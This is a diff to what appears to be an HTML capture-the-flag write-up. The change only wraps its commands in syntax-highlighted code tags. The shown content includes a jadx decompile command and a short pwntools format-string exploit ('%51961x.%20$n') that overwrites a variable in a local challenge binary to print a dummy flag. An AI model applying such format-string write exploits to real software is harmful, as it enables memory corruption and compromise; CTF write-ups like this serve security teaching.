@@ -450,7 +450,9 @@ We are given an APK <a href="../files/inctf/Decode.apk">file</a>. I
 decompiled it using jadx.
 
 <pre>
-jadx-gui Decode.apk
+<code class="bash">
+$ jadx-gui Decode.apk
+</code>
 </pre>
 
 <p>This is what the MainActivity looks like:</p>
@@ -558,20 +560,24 @@ format strings, I came up with the following exploit script:
 </p>
 
 <pre>
+<code class="python">
 from pwn import *
 payload = p32(0x0804c040); #Overwrite_Me
 payload += "%51961x.%20$n"
 print payload
+</code>
 </pre>
 
 
 <pre>
+<code class="bash">
 $ python exploit.py | ./chall
 Please enter your name : Welcome Mr.
 -snip-
                     ff867be0.
 You deserve this.
 Here, take you flag <b>inctf{this_is_a_dummy_flag}</b>
+</code>
 </pre>
 
 
